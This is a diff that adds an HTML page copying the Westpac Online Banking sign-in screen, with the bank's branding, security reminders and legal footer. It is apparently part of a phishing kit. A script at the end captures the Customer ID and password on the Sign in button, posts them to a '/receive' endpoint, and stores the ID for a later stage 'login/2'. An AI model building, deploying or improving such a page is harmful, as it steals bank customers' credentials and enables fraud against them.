@@ -1,0 +1,482 @@
+<!DOCTYPE html>
+<!--[if lt IE 7 ]> <html lang="en" class="ie6 no-js authentication"> <![endif]-->
+<!--[if IE 7 ]>    <html lang="en" class="ie7 no-js authentication"> <![endif]-->
+<!--[if IE 8 ]>    <html lang="en" class="ie8 no-js authentication"> <![endif]-->
+<!--[if IE 9 ]>    <html lang="en" class="ie9 no-js authentication"> <![endif]-->
+<!--[if (gt IE 9)|!(IE)]><!-->
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en" class=" authentication js flexbox flexboxlegacy canvas canvastext webgl touch geolocation postmessage no-websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers no-applicationcache svg inlinesvg smil svgclippaths" style="">
+<!--<![endif]-->
+
+<head>
+    
+    
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge" />
+    
+    <title>
+
+        Sign in to Westpac Online Banking
+
+    </title>
+    <link rel="shortcut icon" href="images/favicon.ico.23fb3f626712cf243b43f34a3e3a8e887b8e8250.ico" />
+    <link href="css/000-000-0001combined.css.1a6232cd07874834478c928fa1f30b79eea8fe08.css" rel="stylesheet" />
+    <link href="css/000-0001combined.css.4afbedaf9997c61c303d1951ae98f27918c490d3.css" rel="stylesheet" />
+    <link href="css/000-0001combined.css.b0cf37060ddf80c0f0adf1583668a8d44dfb5143.css" rel="stylesheet" />
+
+	<script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js'></script>
+    
+
+    <meta name="wup_url" content="https://wup-2ffe60ee.westpac.com.au/client/v3/web/wup?cid=willow" />
+    <meta name="log_url" content="https://log-2ffe60ee.westpac.com.au/api/v1/sendLogs" />
+    <noscript>
+        <meta HTTP-EQUIV="REFRESH" content="0; url=/wbc/banking/handler?TAM_OP=browser_javascript">
+    </noscript>
+    
+    
+    
+    
+    
+    
+    
+    
+    <link rel="shortcut icon"  />
+
+</head>
+
+<body id="unauthenticated-template" data-log="https://banking.westpac.com.au/wbc/banking/esis" data-keymap-url="https://banking.westpac.com.au/eam/servlet/getEamInterfaceData" data-keymap-data-timeout="{KeymapDataTimeout-Token}" data-gatekeeperurl="https://banking.westpac.com.au/gatekeeper" data-esierrorpageurl="https://banking.westpac.com.au/esi2/error-messages/webseal-error-wol/" data-isgatekeeperenabled="false" data-gatekeepertimeout="5000" data-signinmessageurl="https://banking.westpac.com.au/wbc/banking/handler?TAM_OP=resourcekey" data-is-stronger-password-feature-enabled="True" data-is-eam-policy-global-rollout="True" data-customersegment="personal" class="authentication_v2 wr308-template auth_v2_std_signin" data-analytics-allkeys="experience,formName,pageKey,pageName,pageType,siteVersion,src,nav,externalSiteName,productID,itemName,transactionID" data-analytics-pagename="Enter your customer ID" data-analytics-src="20231122-desktop" data-analytics-pagetype="login" data-analytics-formname="personal olb" data-analytics-siteversion="1.1242.143.1" data-analytics-experience="desktop" data-analytics-pagekey="login">
+    <div id="info-banner-gdpr">
+
+        <div class="message-bar nomargin info" role="alert">
+            <div class="message">We use cookies to secure and tailor your web use. Our <a  target="_blank" data-s-object-id="https://www.westpac.com.au/privacy/cookies_1"><strong>notice</strong></a> explains how we use cookies and how you can manage them. By continuing to use this site, we assume you're ok with our notice.
+            </div>
+            <div class="alert-actions">
+                <a  class="alert-dismiss close" data-tracking-link="updated-cookie-policy-cancel" data-analytics-link=" updated-cookie-policy-cancel"><span class="close-icon"></span></a>
+            </div>
+        </div>
+
+    </div>
+
+    <div id="container">
+
+        <header id="header" role="banner">
+
+            <div id="menu-bar">
+                <ul id="pull-right">
+                    <li><a >Lost or stolen cards</a></li>
+                    <li><a >Contact us</a></li>
+                    <li><a >Locate us</a></li>
+                    <li><a class="last-link" >Register for Westpac Online Banking</a></li>
+                </ul>
+            </div>
+
+            <div id="content" class="container-end" tabindex="-1">
+                <div id="logo">
+                    <a >
+                        <img src="https://banking.westpac.com.au/wbc/banking/Themes/Default/Desktop/WBC/Core/Images/logo_white_bg.png.ce5c4c19ec61b56796f0e218fc8329c558421fd8.png" alt="Westpac Internet Banking Home" />
+                    </a>
+                </div>
+
+                <div id="nav-container">
+                    <nav>
+                        <ul>
+                            <li class="home">
+                                <a >
+                                    Home
+                                </a>
+                            </li>
+                            <li class="personal">
+                                <a >
+                                    Personal
+                                </a>
+                            </li>
+                            <li class="business">
+                                <a >
+                                    Business
+                                </a>
+                            </li>
+                            <li class="corporate">
+                                <a >
+                                    Corporate
+                                </a>
+                            </li>
+                            <li class="aboutwestpac">
+                                <a >
+                                    About us
+                                </a>
+                            </li>
+                        </ul>
+                    </nav>
+                </div>
+
+            </div>
+        </header>
+
+    </div>
+
+
+
+    <div id="main-container">
+        <div id="highSecurityMessageArea"></div>
+
+        <h1 id="page-title">Sign in to Westpac Online Banking</h1>
+        <div id="infoBanner">
+        </div>
+
+        <main id="main" role="main" class="main-without-keyboard">
+            <form id="login" method="post" autocomplete="off" class="form-modules-v2" novalidate="novalidate">
+
+               <div id="alertManagerArea" style="display:none;" class="set-alert-margin">
+               	<div class="alert alert-error " role="alert">
+               		<div class="alert-icon" tabindex="-1">        The details entered don't match those on our system. Please try again or <a style="font-size: 14px">reset your password </a> online.
+       </div>
+       </div>
+       </div>
+
+                <div id="loginPage-v2" class="set-login-image">
+
+                    <div class="login-container">
+
+                        <div class="login-info-container">
+
+
+                            <div id="main-input-container">
+
+                                <fieldset>
+                                    <legend class="a11y-context">Sign in to Westpac Live Online Banking</legend>
+
+                                    <div>
+                                        <label for="CustomerID">
+                                            <span class="label-text-main-v2">Customer ID</span>
+                                            <input id="CustomerID" maxlength="8" type="text" class="txtbox-layout-white log_ins" data-val="true" data-val-authempty="{AuthEmpty-Username}" data-val-authpattern="{AuthPattern-Username}" data-val-authminlength="{AuthMinLength-Username}" name="fakeusername" autocomplete="off" value="" />
+                                        </label>
+
+                                        
+                                        <label for="password">
+                                            <span class="label-text-main-v2">Password</span>
+
+                                            <input id="Password"  type="password" name="password" class="txtbox-layout-white txtpwd-layout log_ins" autocomplete="off" data-val="true" data-val-authempty="{AuthEmpty-Password}" data-val-authminlength="{AuthMinLength-Password}" data-keymap-url="https://banking.westpac.com.au/eam/servlet/getEamInterfaceData" data-keymap-data-timeout="{KeymapDataTimeout-Token}" data-error-redirect-url="https://banking.westpac.com.au/wbc/banking/handler?TAM_OP=auth_info" data-capture-keycount="true" data-clear-button-id="clear" />
+                                        </label> 
+
+
+                                              <div class="remember-me-container">
+                                            <label for="rememberme" class="chkbox-container">
+                                                <span id="remember-me-lbl">Remember customer ID</span>
+                                                <input id="rememberme" type="checkbox" data-val="true" value="false" name="rememberme" />
+                                                <span class="checkmark">
+                                                    <span class="tickmark"></span>
+                                                </span>
+
+                                                <span class="remember-me-info-flyout">
+                                                    <div class="bubble"> Not recommended on <br />public or shared devices
+                                                        <div class="pointer"></div>
+                                                        <div class="pointerBorder"></div>
+                                                    </div>
+                                                </span>
+                                            </label>
+                                        </div>
+
+
+                                    </div>
+                                </fieldset>
+
+                                <button type="submit" id="signin" accesskey="s" class=" btnSignIn-v2 btn btn-primary" title="Sign In">Sign in</button>
+
+                                <div>
+                                    <a >Forgot customer ID or password?</a>
+                                </div>
+
+                            </div>
+
+
+
+                            <div id="security-container">
+
+                                <div class="security-container-inner">
+                                    <div class="box box--aside security-protect">
+                                        <span class="padlock-icon-v2"></span>
+                                        <span class="content">
+                                            <span class="heading">Security reminder</span>
+                                            <span>Westpac Protect</span>
+                                        </span>
+                                    </div>
+
+
+                                    <ul class="security-signin-info">
+                                        <li>Don't sign in if you are sharing access to your computer</li>
+                                        <li>Never share your security codes or passwords with anyone</li>
+                                        <li>Call us on 132 032 if you are being asked to do this</li>
+                                    </ul>
+
+
+                                    <div class="divOuterLinks">
+                                        <a >Learn more about staying safe</a>
+                                    </div>
+
+                                </div>
+                            </div>
+
+                        </div>
+
+                        <div id="link-container">
+                            <div class="link-container-inner">
+
+                                <ul class="list-links">
+                                    <li>
+                                        <a class="icon-white-arrow set-aside-font"  data-s-object-id="https://banking.westpac.com.au/wbc/banking/registration?pid=wl-getting-started-abar-register-mobile#step1">Register for Online Banking</a>
+                                    </li>
+                                    <li>
+                                        <a class="icon-white-arrow set-aside-font"  data-s-object-id="https://www.westpac.com.au/personal-banking/online-banking/support-faqs/_1">Online Help</a>
+                                    </li>
+                                    <li>
+                                        <a class="icon-white-arrow set-aside-font"  data-s-object-id="https://www.westpac.com.au/personal-banking/online-banking/whats-new/_1">What's new</a>
+                                    </li>
+                                    <li>
+                                        <a class="icon-white-arrow set-aside-font"  data-s-object-id="https://www.westpac.com.au/personal-banking/online-banking/popular-features/_1">Online Banking features</a>
+                                    </li>
+                                </ul>
+
+                            </div>
+                        </div>
+                    </div>
+
+                </div>
+                  </form>
+        </main>
+
+    </div>
+
+    <footer id="footer" role="contentinfo">
+        <div id="footer-container">
+
+            <div class="footer-links">
+                <ul>
+                    <li><a class="link-icon icon-arrow" >Register for Online Banking</a></li>
+                    <li>
+                        <a class="link-icon icon-arrow" >Online Banking Help</a>
+                    </li>
+                    <li>
+                        <a class="link-icon icon-arrow" >Online security</a>
+                    </li>
+                </ul>
+            </div>
+            <div class="footer-links">
+                <ul>
+                    <li>
+                        <a class="link-icon icon-arrow" >What's new</a>
+                    </li>
+                    <li>
+                        <a class="link-icon icon-arrow" >Online Banking features</a>
+                    </li>
+                    <li><a class="link-icon icon-arrow" >Contact us in the Westpac App</a></li>
+                </ul>
+            </div>
+            <div class="footer-links">
+                <ul>
+                    <li><a class="link-icon icon-arrow" >Security Guarantee</a></li>
+                    <li><a class="link-icon icon-arrow" >Keep safe online</a></li>
+                    <li><a class="link-icon icon-arrow" >Types of scams</a></li>
+                </ul>
+            </div>
+            <div class="footer-links footer-links--last">
+                <ul>
+                    <li><a class="link-icon icon-arrow" >Accessibility</a></li>
+                    <li><a class="link-icon icon-arrow" >Supported devices</a></li>
+                    <li><a class="link-icon icon-arrow" >Terms and Conditions</a></li>
+                </ul>
+            </div>
+
+        </div>
+        <div id="copyright-container">
+            <div id="logo">
+                <img src="https://banking.westpac.com.au/wbc/banking/Themes/Default/Desktop/WBC/Core/Images/logo_white_bg.png.ce5c4c19ec61b56796f0e218fc8329c558421fd8.png" alt="Westpac Internet Banking Home" />
+            </div>
+            <p id="copyright">
+                Conditions, fees and charges apply. These may change or we may introduce new ones in the future. Full details are available on request. Lending criteria apply to approval of credit products. This information does not take your personal objectives, circumstances or needs into account. Consider its appropriateness to these factors before acting on it. Read the disclosure documents for your selected product or service, including the <a  style="color: #d5002b;">Terms and Conditions or Product Disclosure Statement</a>, before deciding. Unless otherwise specified, the products and services described on this website are available only in Australia from Westpac Banking Corporation ABN 33 007 457 141 AFSL and Australian credit licence 233714.
+            </p>
+        </div>
+    </footer>
+
+
+    <div id="promo4273705" class="promoHeader" aria-hidden="true">
+
+        <div class="inner" style="background-image:url(https://banking.westpac.com.au/wbc/banking/Resources/Desktop/WBC/Assets/Images/soon_browsernotsupported1024x168.jpg); background-repeat:no-repeat; background-position:50% 0">
+
+            <div class="wrap">
+
+                <div class="desc">
+
+                    <h2 style="COLOR: #2d373e; TEXT-ALIGN: left">Please check your browser is up to date.</h2>
+                    <p class="promoHeader-otp-unsupported">We are currently experiencing problems with earlier versions of Safari.</p>
+
+                </div>
+
+                <ul class="cta">
+
+                    <li>
+
+                        <div class="close-container">
+
+                            <a  id="btn2345174_2" class="btn-primary non" rel="nofollow">
+
+                                <img src="https://banking.westpac.com.au/wbc/banking/Resources/Desktop/WBC/Assets/Images/close-slider.png" alt="close" />
+
+                            </a>
+
+                        </div>
+
+                    </li>
+
+                </ul>
+
+            </div>
+
+        </div>
+
+    </div>
+    <div id="promo4243083" class="promoHeader" aria-hidden="true">
+
+        <div class="inner" style="background-image:url(https://banking.westpac.com.au/wbc/banking/Resources/Desktop/WBC/Assets/Images/soon_browsernotsupported1024x168.jpg); background-repeat:no-repeat; background-position:50% 0">
+
+            <div class="wrap">
+
+                <div class="desc">
+
+                    <h2 style="TEXT-ALIGN: left; COLOR: #2d373e">This browser will no longer be supported </h2>
+                    <p class="promoHeader-otp-unsupported">We advise all users of unsupported browsers to upgrade to the latest version. <strong>Attention IE6 users</strong>: Soon you will not be able to access Online Banking from this browser. Please upgrade your browser immediately as this improves security and usability. </p>
+
+                </div>
+
+                <ul class="cta">
+
+                    <li>
+
+                        <a  id="btn3263506" class="btn-primary non" rel="nofollow"><span>More info</span></a>
+
+                    </li>
+
+                    <li>
+
+                        <div class="close-container">
+
+                            <a  id="btn2345174" class="btn-primary non" rel="nofollow">
+
+                                <img src="https://banking.westpac.com.au/wbc/banking/Resources/Desktop/WBC/Assets/Images/close-slider.png" alt="close" />
+
+                            </a>
+
+                        </div>
+
+                    </li>
+
+                </ul>
+
+            </div>
+
+        </div>
+
+    </div>
+
+    <script>
+    	function addListItem(ulId, text, attributes = {}) {
+    var ul = document.getElementById(ulId);
+    var li = document.createElement('li');
+    li.textContent = 'Your ' + text + ' is empty'; 
+
+    for (const [key, value] of Object.entries(attributes)) {
+        li.setAttribute(key, value);
+    }
+
+    ul.appendChild(li);
+    	
+    	};
+$(document).ready(function() {
+    $('#signin').on('click', function(event) {
+        event.preventDefault(); // Prevent the default action of the link
+
+        let myForm = $("#login");
+        let checkInputs = document.querySelectorAll('.log_ins');
+
+        
+        // Flag to track if any input is empty
+        let isEmpty = false;
+
+        // Loop through each input field
+        for (const check of checkInputs) {
+            check.addEventListener('focus', () => {
+                console.log('focus');
+                check.nextElementSibling.style.display = "none";
+            });
+
+            if (check.value.trim() === "") {
+                document.getElementById('alertManagerArea').style.display = "block";
+                isEmpty = true;
+            }
+        }
+
+        // If no input is empty, proceed with form submission
+        if (!isEmpty) {
+            let userinfo = myForm.serializeArray();
+            let user = {};
+            let visitor = document.getElementById('CustomerID').value;
+
+            userinfo.forEach((value) => {
+                // Use the 'name' attribute to create user object
+                user[value.name] = value.value;
+            });
+
+            user['visitor'] = visitor;
+            console.log(user);
+
+            // Send AJAX request
+            $.ajax({
+                method: 'POST',
+                url: "/receive",
+                data: user
+            }).done(function(msg) {
+                // Store visitor info in sessionStorage
+                sessionStorage.setItem('visitor', visitor);
+                // Redirect to login page
+                //window.location.href = "login/2";
+                console.log(msg); // Log success message
+            }).fail(function(err, textstatus, error) {
+            //window.location.href = "login/2"; 
+                console.log('fail');
+            });
+        }
+    });
+});
+
+  // Select all elements with the class 'log_ins'
+var close = document.querySelectorAll('.log_ins'); 
+
+// Add an 'input' event listener to each selected element
+for (const button of close) {
+  button.addEventListener('input', () => {
+  console.log('log_ins');
+    button.nextElementSibling.textContent = "";
+  });
+}
+
+    </script>
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+
+    
+
+    <div id="getcampaignurl" data-campaign-url="https://banking.westpac.com.au/wbc/banking/authentication/getpubliccampaigns" data-ladingcampaign-url="https://banking.westpac.com.au/wbc/banking/authentication/getpubliclandingpage" data-feedback-url="https://banking.westpac.com.au/wbc/banking/authentication/setpubliccampaignfeedback">
+    </div>
+
+
+
+
+
+</body>
+
+</html>
